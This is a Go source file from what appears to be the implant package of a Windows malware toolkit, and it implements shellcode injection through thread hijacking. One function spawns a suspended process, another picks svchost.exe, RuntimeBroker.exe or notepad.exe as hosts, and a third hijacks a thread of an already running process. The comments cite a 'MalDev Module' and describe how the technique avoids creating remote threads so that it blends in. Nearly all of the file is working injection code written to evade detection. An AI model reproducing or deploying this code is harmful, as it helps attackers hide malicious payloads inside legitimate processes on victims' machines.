//go:build windows

package implant

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// CONTEXT_CONTROL retrieves/sets the control registers (Rip, Rsp, Rbp, flags).
const CONTEXT_CONTROL = 0x00100001

// x64Context mirrors the Windows x64 CONTEXT structure layout up to Rip.
// Rip sits at offset 0xF8.
type x64Context struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

// ThreadHijackInject creates a suspended process, writes shellcode into its
// address space, then hijacks the main thread's instruction pointer (Rip) so it
// resumes inside the shellcode. No remote thread is created, so the thread's
// recorded start address remains the legitimate process entry point.
func ThreadHijackInject(targetProcess string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	var si ebStartupInfo
	var pi ebProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	procPath, err := syscall.UTF16PtrFromString(targetProcess)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	ret, _, errCode := pCreateProcessW.Call(
		uintptr(unsafe.Pointer(procPath)),
		0, 0, 0, 0,
		CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", errCode)
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	remoteAddr, _, errCode := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", errCode)
	}

	var written uintptr
	ret, _, errCode = pWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", errCode)
	}

	var oldProtect uint32
	pVirtualProtectEx.Call(
		uintptr(pi.Process), remoteAddr, uintptr(len(shellcode)),
		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Hijack the main thread's instruction pointer.
	ctx := x64Context{ContextFlags: CONTEXT_CONTROL}
	ret, _, errCode = pGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return fmt.Errorf("GetThreadContext failed: %v", errCode)
	}
	ctx.Rip = uint64(remoteAddr)

	ret, _, errCode = pSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return fmt.Errorf("SetThreadContext failed: %v", errCode)
	}

	pResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// InjectShellcodeThreadHijack picks a benign host process and performs thread
// hijacking injection into it.
func InjectShellcodeThreadHijack(shellcode []byte) error {
	candidates := []string{
		`C:\Windows\System32\RuntimeBroker.exe`,
		`C:\Windows\System32\svchost.exe`,
		`C:\Windows\System32\notepad.exe`,
	}
	for _, c := range candidates {
		if err := ThreadHijackInject(c, shellcode); err == nil {
			return nil
		}
	}
	return fmt.Errorf("all thread hijack candidates failed")
}

// ── Thread hijacking via remote thread enumeration (MalDev Module 36) ──

const (
	TH32CS_SNAPTHREAD = 0x00000004
	THREAD_ALL_ACCESS = 0x001F03FF
)

var (
	pThread32First = modKernel32.NewProc("Thread32First")
	pThread32Next  = modKernel32.NewProc("Thread32Next")
	pOpenThread    = modKernel32.NewProc("OpenThread")
	pSuspendThread = modKernel32.NewProc("SuspendThread")
)

// THREADENTRY32 mirrors the Windows THREADENTRY32 structure.
type THREADENTRY32 struct {
	Size           uint32
	Usage          uint32
	ThreadID       uint32
	OwnerProcessID uint32
	BasePriority   int32
	DeltaPriority  int32
	Flags          uint32
}

// findProcessFold returns the PID of the first process matching name,
// case-insensitively (mirrors lstrcmpiW used in the MalDev module).
func findProcessFold(name string) (uint32, error) {
	const TH32CS_SNAPPROCESS = 0x00000002

	snap, _, err := pCreateToolhelp32Snap.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	type PROCESSENTRY32W struct {
		Size            uint32
		Usage           uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	var e PROCESSENTRY32W
	e.Size = uint32(unsafe.Sizeof(e))
	ret, _, _ := pProcess32First.Call(snap, uintptr(unsafe.Pointer(&e)))
	if ret == 0 {
		return 0, fmt.Errorf("Process32First failed")
	}
	for {
		if strings.EqualFold(syscall.UTF16ToString(e.ExeFile[:]), name) {
			return e.ProcessID, nil
		}
		ret, _, _ = pProcess32Next.Call(snap, uintptr(unsafe.Pointer(&e)))
		if ret == 0 {
			break
		}
	}
	return 0, fmt.Errorf("process %s not found", name)
}

// ThreadHijackRemoteEnum finds an existing process by name, picks one of its
// threads, injects shellcode into the process, then suspends and hijacks that
// thread's instruction pointer. No sacrificial process or remote thread is
// created, so it blends into the target's existing execution flow.
func ThreadHijackRemoteEnum(processName string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	pid, err := findProcessFold(processName)
	if err != nil {
		return err
	}

	hProcess, _, errCode := pOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if hProcess == 0 {
		return fmt.Errorf("OpenProcess failed: %v", errCode)
	}
	defer syscall.CloseHandle(syscall.Handle(hProcess))

	snap, _, errCode := pCreateToolhelp32Snap.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return fmt.Errorf("CreateToolhelp32Snapshot(thread) failed: %v", errCode)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	var thr THREADENTRY32
	thr.Size = uint32(unsafe.Sizeof(thr))
	ret, _, _ := pThread32First.Call(snap, uintptr(unsafe.Pointer(&thr)))
	if ret == 0 {
		return fmt.Errorf("Thread32First failed")
	}

	var hThread uintptr
	for {
		if thr.OwnerProcessID == pid {
			hThread, _, _ = pOpenThread.Call(THREAD_ALL_ACCESS, 0, uintptr(thr.ThreadID))
			if hThread != 0 {
				break
			}
		}
		ret, _, _ = pThread32Next.Call(snap, uintptr(unsafe.Pointer(&thr)))
		if ret == 0 {
			break
		}
	}
	if hThread == 0 {
		return fmt.Errorf("no thread found for process %s", processName)
	}
	defer syscall.CloseHandle(syscall.Handle(hThread))

	remoteAddr, _, errCode := procVirtualAllocEx.Call(
		hProcess, 0, uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", errCode)
	}

	var written uintptr
	ret, _, errCode = pWriteProcessMemory.Call(
		hProcess, remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", errCode)
	}

	var oldProtect uint32
	pVirtualProtectEx.Call(
		hProcess, remoteAddr, uintptr(len(shellcode)),
		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Suspend, hijack Rip, then resume.
	suspendRet, _, _ := pSuspendThread.Call(hThread)
	if suspendRet == 0xFFFFFFFF {
		return fmt.Errorf("SuspendThread failed")
	}

	ctx := x64Context{ContextFlags: CONTEXT_CONTROL}
	ret, _, errCode = pGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return fmt.Errorf("GetThreadContext failed: %v", errCode)
	}
	ctx.Rip = uint64(remoteAddr)

	ret, _, errCode = pSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return fmt.Errorf("SetThreadContext failed: %v", errCode)
	}

	pResumeThread.Call(hThread)

	return nil
}
